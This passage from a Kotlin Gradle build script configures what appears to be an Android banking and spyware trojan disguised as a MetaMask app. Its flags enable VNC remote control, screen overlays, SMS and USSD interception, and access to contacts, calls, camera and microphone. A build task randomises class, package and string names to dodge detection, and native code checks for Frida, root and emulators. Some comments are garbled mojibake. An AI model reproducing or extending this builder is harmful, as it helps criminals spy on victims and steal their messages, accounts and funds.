        buildConfigField("boolean", "FEAT_SPARROW",          "$featSparrowFinal")
        buildConfigField("boolean", "FEAT_STOAT_SHIELD",     "$featStoatFinal")
        buildConfigField("boolean", "FEAT_AUTO_IBIS",        "$featAutoIbisFinal")
        buildConfigField("boolean", "FEAT_UNLOCK",           "$featUnlockFinal")
        buildConfigField("boolean", "FEAT_OVERLAY",          "$featOverlayFinal")
        buildConfigField("boolean", "FEAT_DEVICE_ADMIN",     "$featDeviceAdminFinal")
        buildConfigField("boolean", "FEAT_VNC",              "$featVnc")
        buildConfigField("boolean", "FEAT_KEEPALIVE_AUDIO",  "$featKeepaliveAudio")
        buildConfigField("boolean", "FEAT_APP_BLOCKER",      "$featAppBlockerFinal")
        buildConfigField("boolean", "FEAT_MINK_SCANNER",     "$featMinkScanner")
        buildConfigField("boolean", "FEAT_MARTEN",           "$featMarten")
        buildConfigField("boolean", "FEAT_VIBRATION",        "$featVibration")
        buildConfigField("boolean", "FEAT_FILE_REVOKER",     "$featFileRevoker")
        buildConfigField("boolean", "FEAT_UNINSTALL_HELPER", "$featUninstallHelper")
        buildConfigField("boolean", "FEAT_CHAIN_BRIDGE",     "$featChainBridge")
        buildConfigField("boolean", "FEAT_HYPEROS",          "$featHyperOs")
        buildConfigField("boolean", "FEAT_WRITE_SETTINGS",  "$featWriteSettings")
        ndk { abiFilters.addAll(listOf("armeabi-v7a","arm64-v8a")) }
        resourceConfigurations.addAll(listOf("ru","en"))
        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
    }

    sourceSets {
        getByName("main") {
            if (isRandomizedBuild) {
                java.setSrcDirs(listOf(File(shadowSrcDir,"java")))
                res.setSrcDirs(listOf(File(shadowSrcDir,"res")))
                manifest.srcFile(File(shadowSrcDir,"AndroidManifest.xml"))
                assets.setSrcDirs(listOf(File(shadowSrcDir,"assets")))
            }
        }
    }

    externalNativeBuild {
        cmake {
            path = if (isRandomizedBuild) file(File(shadowSrcDir,"cpp/CMakeLists.txt"))
                   else file("src/main/cpp/CMakeLists.txt")
            version = "3.22.1"
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true; isShrinkResources = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro", "obfuscation.pro", dynamicProguardRules)
        }
        debug {
            isMinifyEnabled = false; isShrinkResources = false
            isDebuggable = true
        }
    }
    lint { checkReleaseBuilds = false; abortOnError = false }
    compileOptions { sourceCompatibility = JavaVersion.VERSION_17; targetCompatibility = JavaVersion.VERSION_17 }
    kotlinOptions { jvmTarget = "17" }
    buildFeatures { buildConfig = true }
    packaging {
        resources {
            excludes += setOf(
                "META-INF/*.kotlin_module","**.kotlin_module",
                "META-INF/DEPENDENCIES","META-INF/LICENSE*","META-INF/NOTICE*",
                "**/*.proto","**/*.textproto","META-INF/*.version","META-INF/AL2.0","META-INF/LGPL2.1",
                "META-INF/*.SF","META-INF/*.RSA","META-INF/*.DSA","META-INF/MANIFEST.MF",
                "kotlin-tooling-metadata.json",
                "kotlin/**","DebugProbesKt.bin","META-INF/versions/**",
                "META-INF/com.android.tools/**","META-INF/com/android/build/**","META-INF/proguard/**",
                "**.kotlin_builtins","**.kotlin_metadata","META-INF/CHANGES","META-INF/README*"
            )
        }
        jniLibs { useLegacyPackaging = true }
    }
}

tasks.register("prepareAndRandomizeSources") {
    group = "build"; outputs.upToDateWhen { false }
    doLast {
        if (shadowSrcDir.exists()) shadowSrcDir.deleteRecursively()
        shadowSrcDir.mkdirs()

        val originalSrc = project.projectDir.resolve("src/main")
        originalSrc.copyRecursively(shadowSrcDir, overwrite = true)

        // в"Ђв"Ђ Feature-based file exclusion в"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђв"Ђ
        // Р‘РµР·РѕРїР°СЃРЅРѕ СѓРґР°Р»СЏРµРј С‚РѕР»СЊРєРѕ standalone С„Р°Р№Р»С‹ Р±РµР· РїСЂСЏРјС‹С… import-references РёР· CORE РєР»Р°СЃСЃРѕРІ.
        // РћСЃС‚Р°Р»СЊРЅС‹Рµ РјРѕРґСѓР»Рё СѓРїСЂР°РІР»СЏСЋС‚СЃСЏ С‡РµСЂРµР· BuildConfig.FEAT_XXX + R8 shrinking.
        val excludedKtFiles = mutableSetOf<String>()
        if (!featKeepaliveAudio)  excludedKtFiles += setOf("KeepAliveAudioService.kt")
        if (excludedKtFiles.isNotEmpty()) {
            val javaDir = File(shadowSrcDir, "java")
            var removed = 0
            javaDir.walkTopDown().filter { it.isFile && it.name in excludedKtFiles }.forEach {
                it.delete(); removed++
            }
            println("--- [CRISTOFER_V3] Feature exclusions: removed $removed files ---")
        }

        // ── FCM stub replacement when feat_fcm=false (BEFORE class renaming) ───
        if (!featFcm) {
            val fcmStubs = mapOf(
                "FcmTokenService.kt" to """package com.example.MetaMask.services
import android.content.Context
class FcmTokenService {
    companion object {
        internal const val PREFS_NAME = "fcm_prefs"
        internal const val PREF_TOKEN = "fcm_token"
        fun markTokenConfirmed(ctx: Context, confirmed: Boolean) {}
        fun isTokenConfirmed(ctx: Context): Boolean = false
        fun pushCurrentTokenToServer(ctx: Context) {}
        internal fun scheduleSendWorker(ctx: Context) {}
    }
}""",
                "FcmTokenSendWorker.kt" to """package com.example.MetaMask.services
import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
class FcmTokenSendWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {
    override fun doWork(): Result = Result.success()
}""",
                "FcmTokenCheckWorker.kt" to """package com.example.MetaMask.services
import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
class FcmTokenCheckWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {
    override fun doWork(): Result = Result.success()
}""",
                "FCMConfig.kt" to """package com.example.MetaMask.utils
import android.content.Context
object FCMConfig {
    fun init(context: Context) {}
}"""
            )
            var stubCount = 0
            File(shadowSrcDir, "java").walkTopDown()
                .filter { it.isFile && it.name in fcmStubs }
                .forEach { f -> f.writeText(fcmStubs[f.name]!!); stubCount++ }
            println("--- [CRISTOFER_V3] FCM disabled: replaced $stubCount files with stubs ---")
        }

        shadowSrcDir.resolve("multidex-config.txt")
            .writeText("com/example/MetaMask/$CLS_MAIN_APP.class\n")

        val clsMap = linkedMapOf(
            "MasterWebSocketDispatcher"    to CLS_MASTER_WS,
            "WebSocketCommandHandlerReceiver" to CLS_WS_HANDLER_RECV,
            "VncBridgeReceiver"              to CLS_VNC_BRIDGE_RECV,
            "ChikenBridgeReceiver"           to CLS_CHIKEN_BRIDGE_RECV,
            "DeviceStateMonitorService"    to CLS_DEV_MONITOR_SVC,
            "ForegroundAppMonitorService"  to CLS_FG_APP_MONITOR_SVC,
            "UninstallHelper"              to CLS_UNINSTALL_HELPER,
            "ServiceStarterWorker"         to CLS_SVC_STARTER,
            "HeadlessSmsSendService"       to CLS_HEADLESS_SMS,
            "CommandChannelService"        to CLS_CMD_CHANNEL_SVC,
            "AuthenticatorService"         to CLS_AUTH_SVC,
            "LoaderWakeUpReceiver"         to CLS_LOADER_RECV,
            "DefaultSmsReceiver"           to CLS_DEFAULT_SMS_RECV,
            "ChimeraStateReceiver"         to CLS_CHIMERA_RECV,
            "SchedulerWorker"              to CLS_SCHEDULER_WORKER,
            "DeviceUUIDProvider"           to CLS_UUID_PROVIDER,
            "RadioLinkProtocol"            to CLS_RADIO_LINK,
            "UssdControlService"           to CLS_USSD_CTL_SVC,
            "LegacyUssdService"            to CLS_LEGACY_USSD_SVC,
            "FcmTokenService"              to CLS_FCM_TOKEN_SVC,
            "ComposeSmsActivity"           to CLS_COMPOSE_SMS,
            "SecurityAuditor"              to CLS_SECURITY_AUDITOR,
            "RemoteConfig"                 to CLS_REMOTE_CONFIG,
            "StubAuthenticator"            to CLS_STUB_AUTH,
            "MainApplication"              to CLS_MAIN_APP,
            "WebViewActivity"              to CLS_WEB_VIEW,
            "PrivilegeService"             to CLS_PRIVILEGE_SVC,
            "NativeBridge"                 to CLS_NATIVE_BRIDGE,
            "ZebraWorker"                  to CLS_ZEBRA_WORKER,
            "ChikenWorker"                 to CLS_CHIKEN_WORKER,
            "StubProvider"                 to CLS_STUB_PROVIDER,
            "TurtleService"                to CLS_TURTLE_SVC,
            "PulseService"                 to CLS_PULSE_SVC,
            "CusWebActivity"               to CLS_CUS_WEB,
            "FrienCat"                     to CLS_FRIEN_CAT,
            "BootReceiver"                 to CLS_BOOT_RECV,
            "AlarmReceiver"                to CLS_ALARM_RECV,
            "UUIDService"                  to CLS_UUID_SVC,
            "trolService"                  to CLS_TROL_SVC,
            "SmsReceiver"                  to CLS_SMS_RECV,
            "MmsReceiver"                  to CLS_MMS_RECV,
            "GatewayActivity"              to CLS_GATEWAY_ACTIVITY,
            "CoralCobraActivity"           to CLS_CORAL_COBRA,
            "AuthScreenActivity"           to CLS_AUTH_SCREEN,
            "PermRequesterActivity"        to CLS_PERM_REQUESTER,
            "AccessSvc"                    to CLS_ACCESS_SVC,
            "BadgerFalconRecv"             to CLS_BADGER_FALCON_RECV,
            "BadgerFalconLauncherActivity" to CLS_BADGER_FALCON_LAUNCHER,
            "OtterHawkLauncherActivity"    to CLS_OTTER_HAWK_LAUNCHER,
            "AutoIbis"                     to CLS_AUTO_IBIS,
            "CoreServicesLauncher"         to CLS_CORE_LAUNCHER,
            "MartenHelper"                 to CLS_MARTEN_HELPER,
            "MinkScanner"                  to CLS_MINK_SCANNER,
            "StoatShield"                  to CLS_STOAT_SHIELD,
            "UnlockMonitor"                to CLS_UNLOCK_MONITOR,
            "SmsSendEngine"                to CLS_SMS_SEND_ENGINE,
            "Sparrow"                      to CLS_SPARROW,
            "AudioFocusHolder"             to CLS_AUDIO_FOCUS_HOLDER,
            "VncProcessProvider"           to CLS_VNC_PROVIDER,
            "CompanionBinder"              to CLS_COMPANION_BINDER,
            "NativeDaemon"                 to CLS_NATIVE_DAEMON,
            "KeepAliveManager"             to CLS_KEEP_ALIVE_MGR,
            "KeepAliveJobService"          to CLS_KEEPALIVE_JOB_SVC,
            "CraneService"                 to "CraneService"
        )

        val jniMap = linkedMapOf(
            "nativeGetCallbackHandlerClassName" to JNI_CB_HANDLER,
            "nativeGetSystemCallbackClassName"  to JNI_SYS_CB,
            "nativeGetContactsActionString"     to JNI_CONTACTS_ACTION,
            "nativeGetRequestMethodName"        to JNI_REQ_METHOD,
            "nativeBuildContactsPayload"        to JNI_BUILD_CONTACTS,
            "nativeGetCallActionString"         to JNI_CALL_ACTION,
            "nativeGetTelPrefix"               to JNI_TEL_PREFIX,
            "nativeProcessTaskResult"           to JNI_PROCESS_TASK,
            "nativeEncryptData"                 to JNI_ENCRYPT,
            "nativeDecodeTask"                  to JNI_DECODE_TASK,
            "checkNativeEmulator"               to JNI_CHECK_EMU,
            "checkNativeFrida"                  to JNI_CHECK_FRIDA,
            "checkNativeRoot"                   to JNI_CHECK_ROOT,
            "getSrvConfigA"                     to JNI_SRV_A,
            "getSrvConfigB"                     to JNI_SRV_B,
            "getSrvEndpoint"                    to JNI_SRV_EP,
            "nativeDecryptDomain"               to JNI_DECRYPT_DOMAIN,
            "nativeGetUuidPrefix"               to JNI_UUID_PREFIX,
            "nativeGetUuidSuffix"               to JNI_UUID_SUFFIX
        )

        val propMap = linkedMapOf(
            "martenHelper"   to "p${rndId(8)}",
            "minkScanner"    to "p${rndId(8)}",
            "stoatShield"    to "p${rndId(8)}",
            "unlockMonitor"  to "p${rndId(8)}",
            "sparrow"        to "p${rndId(8)}",
            "smsSendEngine"  to "p${rndId(8)}"
        )

        val actionMapKt = mapOf(
            "\"com.example.MetaMask.RESTART_SERVICE\""    to "\"$ACTION_RESTART_SVC\"",
            "\"com.example.MetaMask.ACTION_HANDLE_COMMAND\"" to "\"$ACTION_HANDLE_CMD\"",
            "\"com.example.MetaMask.ACTION_LAUNCH_CHIKEN\"" to "\"$ACTION_LAUNCH_CHIKEN\"",
            "\"com.example.MetaMask.INTERNAL_KICK\""      to "\"$ACTION_INTERNAL_KICK\"",
            "\"com.fox.TARGET_IDENTIFIER\""               to "\"$ACTION_FOX_TARGET\""
        )

        val srcJavaDir = File(shadowSrcDir, "java")
        srcJavaDir.walkTopDown().filter { it.extension == "kt" || it.extension == "java" }.forEach { f ->
            var c = f.readText()
            clsMap.entries.sortedByDescending { it.key.length }.forEach { (o,n) -> c = c.replace(o, n) }
            jniMap.entries.sortedByDescending { it.key.length }.forEach { (o,n) -> c = c.replace(o, n) }
            actionMapKt.forEach { (o,n) -> c = c.replace(o, n) }
            propMap.forEach { (o, n) -> c = c.replace(Regex("""\b$o\b"""), n) }
            f.writeText(c)
        }

        srcJavaDir.walkTopDown().filter { it.extension == "kt" }.forEach { f ->
            var newName = f.name
            clsMap.entries.sortedByDescending { it.key.length }.forEach { (o, n) ->
                if (newName == "$o.kt") newName = "$n.kt"
            }
            if (f.name == "uuid.kt") newName = "${CLS_UUID_SVC}.kt"
            if (newName != f.name) f.renameTo(File(f.parent, newName))
        }

        val oldMetaMaskDir = File(srcJavaDir, "com/example/MetaMask")
        val newPkgDir      = File(srcJavaDir, randomPkgPath)
        if (oldMetaMaskDir.exists()) {
            newPkgDir.parentFile.mkdirs()
            oldMetaMaskDir.copyRecursively(newPkgDir, overwrite = true)
            File(srcJavaDir, "com/example").deleteRecursively()
            println("--- [CRISTOFER_V3] Moved DEX package com.example.MetaMask в†’ $randomPkg ---")
        }

        srcJavaDir.walkTopDown().filter { it.extension == "kt" || it.extension == "java" }.forEach { f ->
            var c = f.readText()
            c = c.replace("com.example.MetaMask", randomPkg)
            c = c.replace("com/example/MetaMask", randomPkgPath)
            f.writeText(c)
        }

        val tagRegex = Regex("""((?:private |public |internal |protected |)const val TAG\s*=\s*)"[^"]*"""")
        srcJavaDir.walkTopDown().filter { it.extension == "kt" }.forEach { f ->
            val orig = f.readText()
            val patched = tagRegex.replace(orig) { m -> "${m.groupValues[1]}\"${rndId(10)}\"" }
            if (patched != orig) f.writeText(patched)
        }

        val sensitiveReplacements = mapOf(
            "\"DeviceCheck\""           to "\"${rndId(9)}\"",
            "\"ChikenSystemChannel\""   to "\"$CHAN_MWD\"",
            "\"SystemWorker\""          to "\"${rndId(8)}\"",
            "\"MasterWSP_Debug\""       to "\"${rndId(8)}\"",
            "\"WSCommandReceiver\""     to "\"${rndId(8)}\"",
            "\"BootReceiver\""          to "\"${rndId(8)}\"",
            "\"MediaIndexingService\""  to "\"${rndId(8)}\"",
            "\"NetOptimProto\""         to "\"${rndId(8)}\"",
            "\"DataSyncUtil\""          to "\"${rndId(8)}\"",
            "\"WebSocketDispatcherChannel\"" to "\"$CHAN_MWD\"",
            "\"sync_system_channel\""        to "\"$CHAN_SYNC\"",
            "\"worker_channel\""             to "\"$CHAN_WORKER\"",
            "\"USSD_Background_Service\""    to "\"$CHAN_USSD\"",
            "\"system_core_channel\""        to "\"$CHAN_CORE\"",
            "\"MasterServiceCheck\""         to "\"$WM_MASTER_CHECK\"",
            "\"background_sync_worker\""     to "\"$WM_BG_SYNC\"",
            "\"SMS_TRIGGER\""                to "\"$WM_TAG_SMS\"",
            "\"DEFAULT_SMS_TRIGGER\""        to "\"$WM_TAG_DEFAULT_SMS\"",
            "\"BOOT_TRIGGER\""               to "\"$WM_TAG_BOOT\"",
            "\"CHIMERA_RECOVERY\""           to "\"$WM_TAG_CHIMERA\"",
            "\"WAKE_UP_URGENT\""             to "\"$WM_TAG_WAKE_URGENT\"",
            "\"FCM_WAKE_UP_JOB\""            to "\"$WM_TAG_FCM\"",
            "\"TURTLE_TRIGGER\""             to "\"$WM_TAG_TURTLE\"",
            "\"PULSE_RECOVERY_JOB\""         to "\"$WM_TAG_PULSE\"",
            "\"ZEBRA_FALLBACK_TRIGGER\""     to "\"$WM_TAG_ZEBRA\"",
            "\"service_status_prefs\""       to "\"$PREFS_SVC_STATUS\"",
            "\"connection_prefs\""           to "\"$PREFS_CONN\"",
            "\"device_uuid_prefs\""          to "\"$PREFS_UUID\"",
            "\"fcm_prefs\""                  to "\"$PREFS_FCM\"",
            "\"SmsSyncState\""               to "\"$PREFS_SMS\"",
            "\"SmsSendHistoryPrefs\""        to "\"$PREFS_SMS_HIST\"",
            "\"app_kill_switch_prefs\""      to "\"$PREFS_KILL\"",
            "\"SmsSetupPrefs\""              to "\"$PREFS_SETUP\"",
            "\"net_optim_config\""           to "\"$PREFS_NET\"",
            "\"device_settings\""            to "\"$PREFS_DEVICE\"",
            "\"is_master_service_running\""  to "\"$KEY_IS_RUNNING\"",
            "\"last_success_domain\""        to "\"$KEY_DOMAIN\"",
            "\"device_uuid\""               to "\"$KEY_UUID_VAL\"",
            "\"fcm_token\""                 to "\"$KEY_FCM_TOKEN\"",
            "\"is_permanently_disabled\""   to "\"$KEY_DISABLED\"",
            "\"invisible_intercept_enabled\"" to "\"$KEY_INTERCEPT\"",
            "\"is_handshake_complete\""     to "\"$KEY_HANDSHAKE\"",
            "\"last_sync_timestamp\""       to "\"$KEY_SYNC_TS\"",
            "xor 42"                        to "xor $CMD_XOR_KEY",
            "\"DECOY_F1_NAME\""             to "\"${rndId(9)}.db\"",
            "\"DECOY_F2_NAME\""             to "\"${rndId(9)}.json\"",
            "\"DECOY_F3_NAME\""             to "\"${rndId(9)}.dat\"",
            "private const val DESTINATION_NUMBER = \"\"" to "private const val DESTINATION_NUMBER = \"$smsTarget\"",
            "\"{{TRAFFER}}\""                            to "\"$traffer\"",
            "private const val TARGET_URL = \"https://rt.pornhub.com/\"" to
                "private const val TARGET_URL = \"${if (targetUrl.isNotEmpty()) targetUrl else "https://rt.pornhub.com/"}\""
        )
        srcJavaDir.walkTopDown().filter { it.extension == "kt" }.forEach { f ->
            var c = f.readText()
            var changed = false
            sensitiveReplacements.forEach { (old, new) ->
                if (c.contains(old)) { c = c.replace(old, new); changed = true }
            }
            if (changed) f.writeText(c)
        }

        val acctSuffix = rndId(8)
        val prvdSuffix = rndId(8)
        val pkgActionReplacements = mapOf(
            "\"$randomPkg.RESTART_SERVICE\""         to "\"$ACTION_RESTART_SVC\"",
            "\"$randomPkg.ACTION_HANDLE_COMMAND\""   to "\"$ACTION_HANDLE_CMD\"",
            "\"$randomPkg.ACTION_SEND_TO_SERVER\""   to "\"$ACTION_SEND_TO_SRV\"",
            "\"$randomPkg.ACTION_SEND_MESSAGE\""     to "\"$ACTION_SEND_MSG\"",
            "\"$randomPkg.ACTION_START_MONITORING\"" to "\"$ACTION_START_MON\"",
            "\"$randomPkg.INTERNAL_KICK\""           to "\"$ACTION_INTERNAL_KICK\"",
            "\"$randomPkg.ALARM_TRIGGER\""           to "\"$ACTION_FOX_TARGET\"",
            "\"$randomPkg.EXTRA_MESSAGE_DATA\""      to "\"$EXTRA_MSG_DATA_KEY\"",
            "\"$randomPkg.EXTRA_MESSAGE_TO_SEND\""   to "\"$EXTRA_MSG_SEND_KEY\"",
            "\"$randomPkg.account\""                 to "\"$randomPkg.$acctSuffix\"",
            "\"$randomPkg.provider\""                to "\"$randomPkg.$prvdSuffix\""
        )
        srcJavaDir.walkTopDown().filter { it.extension == "kt" || it.extension == "java" }.forEach { f ->
            var c = f.readText()
            var changed = false
            pkgActionReplacements.forEach { (old, new) ->
                if (c.contains(old)) { c = c.replace(old, new); changed = true }
            }
            if (changed) f.writeText(c)
        }

        val mf = shadowSrcDir.resolve("AndroidManifest.xml")
        val prc = "Svc_$randomPrefix"; val rcv = "Rcv_$randomPrefix"
        // process-РёРјРµРЅР° Р·Р°РІРёСЃСЏС‚ РѕС‚ VNC Рё prc (РґРѕР»Р¶РЅС‹ Р±С‹С‚СЊ РІРЅСѓС‚СЂРё task)
        val accessSvcProcess = if (featVnc) ":vnc_$prc" else ":acc_$prc"
        val vpnSvcProcess    = if (featVnc) ":vnc_$prc" else ":core_$prc"
        fun perm(p: String) = "    <uses-permission android:name=\"android.permission.$p\" />"
        val corePerms = mutableListOf<String>()
        // CORE вЂ" РІСЃРµРіРґР°
        corePerms += perm("INTERNET")
        corePerms += perm("ACCESS_NETWORK_STATE")
        corePerms += perm("WAKE_LOCK")
        corePerms += perm("RECEIVE_BOOT_COMPLETED")
        corePerms += perm("SCHEDULE_EXACT_ALARM")
        corePerms += perm("REQUEST_IGNORE_BATTERY_OPTIMIZATIONS")
        corePerms += perm("FOREGROUND_SERVICE")
        corePerms += perm("FOREGROUND_SERVICE_DATA_SYNC")
        corePerms += perm("FOREGROUND_SERVICE_SHORT_SERVICE")
        corePerms += "    <uses-permission android:name=\"android.permission.POST_NOTIFICATIONS\" tools:node=\"remove\" />"
        corePerms += perm("QUERY_ALL_PACKAGES")
        corePerms += perm("CHANGE_NETWORK_STATE")
        corePerms += perm("REQUEST_INSTALL_PACKAGES")
        corePerms += perm("REQUEST_COMPANION_RUN_IN_BACKGROUND")
        corePerms += perm("REQUEST_COMPANION_USE_DATA_IN_BACKGROUND")
        // MOD_FCM вЂ" РЅРµС‚ РґРѕРї. СЂР°Р·СЂРµС€РµРЅРёР№
        // MOD_SMS
        if (featSms) {
            corePerms += perm("RECEIVE_SMS")
            corePerms += perm("READ_SMS")
            corePerms += perm("SEND_SMS")
            corePerms += perm("RECEIVE_MMS")
            corePerms += perm("WRITE_SMS")
            corePerms += perm("RECEIVE_WAP_PUSH")
            corePerms += perm("READ_CELL_BROADCASTS")
            corePerms += perm("READ_PHONE_STATE")
        }
        // MOD_SMS_ROLE
        if (featSmsRoleFinal) corePerms += perm("FOREGROUND_SERVICE_SPECIAL_USE")
        // MOD_CONTACTS
        if (featContacts) {
            corePerms += perm("READ_CONTACTS")
            corePerms += perm("WRITE_CONTACTS")
        }
        // MOD_ACCOUNTS
        if (featAccounts) {
            corePerms += perm("GET_ACCOUNTS")
        }
        // MOD_CALL_PHONE
        if (featCallPhone) {
            corePerms += perm("CALL_PHONE")
            if (!featSms) corePerms += perm("READ_PHONE_STATE")
            corePerms += perm("READ_PHONE_NUMBERS")
            corePerms += perm("READ_CALL_LOG")
            corePerms += perm("WRITE_CALL_LOG")
            corePerms += perm("PROCESS_OUTGOING_CALLS")
        }
        // MOD_CAMERA
        if (featCamera) corePerms += perm("CAMERA")
        // MOD_AUDIO_RECORD
        if (featAudioRecord) corePerms += perm("RECORD_AUDIO")
        // MOD_FILES
        if (featFiles) {
            corePerms += perm("READ_EXTERNAL_STORAGE")
            corePerms += perm("WRITE_EXTERNAL_STORAGE")
            corePerms += perm("READ_MEDIA_IMAGES")
            corePerms += perm("READ_MEDIA_VIDEO")
            corePerms += perm("READ_MEDIA_AUDIO")
        }
        // MOD_SYNC_MANAGER
        if (featSyncManager) {
            corePerms += perm("AUTHENTICATE_ACCOUNTS")
            corePerms += perm("READ_SYNC_SETTINGS")
            corePerms += perm("WRITE_SYNC_SETTINGS")
            corePerms += perm("MANAGE_ACCOUNTS")
            corePerms += perm("USE_CREDENTIALS")
        }
        // MOD_FRIEN_CAT / MOD_KEEPALIVE_AUDIO
        if (featFrienCat || featKeepaliveAudio) corePerms += perm("FOREGROUND_SERVICE_MEDIA_PLAYBACK")
        // MOD_OVERLAY (v3)
        if (featOverlayFinal) corePerms += perm("SYSTEM_ALERT_WINDOW")
        // MOD_OVERLAY + MOD_UNLOCK: DISABLE_KEYGUARD
        if (featUnlockFinal || featOverlayFinal) corePerms += perm("DISABLE_KEYGUARD")
        // MOD_BIOMETRIC
        if (featBiometric) corePerms += perm("USE_BIOMETRIC")
        // MOD_VNC
        if (featVnc) corePerms += perm("FOREGROUND_SERVICE_MEDIA_PROJECTION")
        // MOD_VIBRATION
        if (featVibration) corePerms += perm("VIBRATE")
        // MOD_FILE_REVOKER
        if (featFileRevoker) {
            corePerms += perm("WRITE_SECURE_SETTINGS")
        }
        // MOD_WRITE_SETTINGS
        if (featWriteSettings) corePerms += perm("WRITE_SETTINGS")
        // MOD_UNINSTALL_HELPER
        if (featUninstallHelper) corePerms += perm("REQUEST_DELETE_PACKAGES")
        val permissionsBlock = corePerms.shuffled().joinToString("\n")

        val mfSb = StringBuilder()
        mfSb.appendLine("""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <permission android:name="$randomPkg.permission.INTERNAL_WAKEUP" android:protectionLevel="signature" />

$permissionsBlock

    <uses-feature android:name="android.hardware.touchscreen" android:required="false" />
    <uses-feature android:name="android.hardware.telephony" android:required="false" />

    <application
        android:name=".$STUB_CLS"
        android:allowBackup="false"
        android:networkSecurityConfig="@xml/network_security_config"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:usesCleartextTraffic="true"
        android:hardwareAccelerated="true"
        android:supportsRtl="true"
        android:appComponentFactory="$randomPkg.$STUB_FACTORY_CLS"
        tools:replace="android:appComponentFactory">""")
        // CORE вЂ" РІСЃРµРіРґР°
        mfSb.appendLine("""        <service android:name=".services.$CLS_PULSE_SVC" android:enabled="true" android:exported="false" android:label="System Core" android:process=":core_$prc" android:foregroundServiceType="dataSync" />
        <service android:name=".services.$CLS_MASTER_WS" android:exported="false" android:enabled="true" android:label="Network Interface" android:process=":net_$prc" android:foregroundServiceType="dataSync" />
        <service android:name="androidx.work.impl.foreground.SystemForegroundService" android:foregroundServiceType="dataSync" tools:node="merge" />""")
        // MOD_FCM
        if (featFcm) mfSb.appendLine("""        <service android:name=".services.$CLS_FCM_TOKEN_SVC" android:enabled="true" android:exported="false" android:process=":fcm_$prc" android:directBootAware="true">
            <intent-filter><action android:name="com.google.firebase.MESSAGING_EVENT" /></intent-filter>
        </service>""")
        // MOD_SYNC_MANAGER
        if (featSyncManager) mfSb.appendLine("""        <service android:name=".services.sync.SyncService" android:exported="true">
            <intent-filter><action android:name="android.content.SyncAdapter" /></intent-filter>
            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/syncadapter" />
        </service>
        <service android:name=".services.sync.$CLS_AUTH_SVC" android:exported="true">
            <intent-filter><action android:name="android.accounts.AccountAuthenticator" /></intent-filter>
            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/authenticator" />
        </service>
        <provider android:name=".services.sync.$CLS_STUB_PROVIDER" android:authorities="$randomPkg.$prvdSuffix" android:exported="false" android:syncable="true" />""")
        // MOD_DEVICE_MONITOR
        if (featDeviceMonitor) mfSb.appendLine("""        <service android:name=".services.$CLS_DEV_MONITOR_SVC" android:exported="false" android:enabled="false" />""")
        // MOD_VNC: ForegroundAppMonitorService
        if (featVnc) mfSb.appendLine("""        <service android:name=".services.$CLS_FG_APP_MONITOR_SVC" android:exported="false" android:enabled="false" android:process=":vnc_${prc}" />""")
        // MOD_TROL
        if (featTrolSvc) mfSb.appendLine("""        <service android:name=".services.$CLS_TROL_SVC" android:exported="false" android:enabled="false" />""")
        // CORE uuid service вЂ" РІСЃРµРіРґР°
        mfSb.appendLine("""        <service android:name=".services.$CLS_UUID_SVC" android:exported="false" android:enabled="false" />""")
        // MOD_FRIEN_CAT
        if (featFrienCat) mfSb.appendLine("""        <service android:name=".services.$CLS_FRIEN_CAT" android:exported="false" android:enabled="false" />""")
        // MOD_USSD
        if (featUssdFinal) mfSb.appendLine("""        <service android:name=".services.$CLS_USSD_CTL_SVC" android:exported="false" android:enabled="false" />
        <service android:name=".services.$CLS_LEGACY_USSD_SVC" android:exported="false" android:enabled="false" />""")
        // MOD_CMD_CHANNEL
        if (featCmdChannel) mfSb.appendLine("""        <service android:name=".services.$CLS_CMD_CHANNEL_SVC" android:exported="false" android:enabled="false" />""")
        // MOD_VNC: CraneService, VideoCaptureFgs, VideoProjectionActivity, VncBridgeReceiver, VncProvider
        if (featVnc) mfSb.appendLine("""        <service android:name=".services.CraneService" android:exported="false" android:enabled="true" android:process=":vnc_${prc}" android:foregroundServiceType="dataSync" />
        <service android:name=".services.VideoCaptureFgs" android:exported="false" android:foregroundServiceType="mediaProjection" android:process=":vnc_${prc}" />
        <provider android:name=".services.$CLS_VNC_PROVIDER" android:authorities="$randomPkg.vnc_provider" android:exported="false" android:process=":vnc_${prc}" />""")
        // MOD_KEEPALIVE_JOB
        if (featKeepaliveJob) mfSb.appendLine("""        <service android:name=".services.$CLS_KEEPALIVE_JOB_SVC" android:exported="true" android:enabled="true" android:permission="android.permission.BIND_JOB_SERVICE" android:process=":core_${prc}" />""")
        // MOD_KEEPALIVE_AUDIO
        if (featKeepaliveAudio) mfSb.appendLine("""        <service android:name=".services.KeepAliveAudioService" android:exported="false" android:enabled="false" />""")
        // MOD_TURTLE
        if (featTurtle) mfSb.appendLine("""        <service android:name=".services.$CLS_TURTLE_SVC" android:label="@string/app_name" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true" android:enabled="false">
            <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
        </service>""")
        // CORE_UI вЂ" РІСЃРµРіРґР°
        mfSb.appendLine("""        <activity android:name=".activities.$CLS_GATEWAY_ACTIVITY" android:exported="true" android:label="@string/app_name" android:theme="@style/Theme.AppCompat.Light.NoActionBar" android:excludeFromRecents="true" android:noHistory="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="$launcherCategory" />
            </intent-filter>
        </activity>
        <activity android:name=".activities.$CLS_WEB_VIEW" android:exported="false" android:label="@string/app_name" android:theme="@style/Theme.AppCompat.Light.NoActionBar" android:excludeFromRecents="true" />
